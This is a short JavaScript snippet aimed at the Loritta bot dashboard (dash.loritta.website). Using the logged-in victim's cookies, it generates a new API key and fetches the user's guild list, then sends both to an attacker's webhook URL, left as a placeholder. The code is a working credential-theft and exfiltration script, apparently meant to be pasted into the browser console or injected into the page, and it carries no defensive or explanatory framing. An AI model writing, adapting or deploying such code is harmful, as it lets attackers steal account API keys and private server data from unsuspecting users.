let webhookurl = "webhookurl"

fetch("https://dash.loritta.website/br/api-keys/generate", {
  "headers": {
    "referrerPolicy": "no-referrer",
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "bliss-request": "true",
    "priority": "u=1, i",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin"
  },
  "referrer": "https://dash.loritta.website/br/api-keys",
  "body": null,
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
}).then(c => {
    c.text().then(content => {

        fetch(webhookurl, {
            method: "POST",
            headers: {
                 "Content-Type": "application/json"
            },
            body: JSON.stringify({
                content
            })
        })
    })
})

fetch("https://dash.loritta.website/br/guilds", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "bliss-request": "true",
    "bliss-trigger-element-id": "user-guilds",
    "priority": "u=1, i",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin"
  },
  "body": null,
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
}).then(v => {
   v.text().then(content => {
    const file = new Blob([content], { type: "text/plain" });

    const form = new FormData();
    form.append("file[0]", file, "mensagem.txt");

    fetch(webhookurl, {
            method: "POST",
            body: form,
        })
   })
})
